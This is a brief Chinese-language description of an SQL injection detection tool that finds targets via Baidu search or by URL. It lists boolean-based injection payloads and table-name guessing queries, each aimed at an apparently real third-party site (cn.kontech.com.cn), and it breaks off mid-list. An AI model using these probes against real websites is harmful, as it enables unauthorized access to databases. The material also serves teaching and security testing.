

sql注入检测工具


功能：
检测网站是否存在sql注入点，并获取数据库信息。

特点：
1.从百度搜索sql注入点
2.指定网站地址搜索注入点
3.指定url注入点

注入点检测：
1.(')
正常url：http://cn.kontech.com.cn/about.php?id=1
构造url：http://cn.kontech.com.cn/about.php?id=1'
结果：异常
sql查询语句: select * from db where id='''
2.(' and '1'='1)或( and 1=1)
正常url：http://cn.kontech.com.cn/about.php?id=1
构造url：http://cn.kontech.com.cn/about.php?id=1' and '1'='1
结果：正常
sql查询语句：select * from db where id='1' and '1'='1'
3.(' and '1'='2)或( and 1=2)
正常url：http://cn.kontech.com.cn/about.php?id=1
构造url：http://cn.kontech.com.cn/about.php?id=1' and '1'='2
结果：异常
sql查询语句：select * from db where id='1' and '1'='2'

数据库名不需要猜解。

猜数据库的表名：
1.( and exists(select * from admin) and 1=1) 或 (' and exists(select * from admin) and '1'='1)
正常url：http://cn.kontech.com.cn/about.php?id=1
构造url：
http://cn.kontech.com.cn/about.php?id=1' and exists(select * from admin) and '1'='1
http://cn.kontech.com.cn/about.php?id=1 and exists(select * from admin) and 1=1
结果：正常
sql查询语句：select * from db where id='1' and exists(select * from admin) and '1'='1'
2.( and 0 <= (select COUNT(*) from [User]))





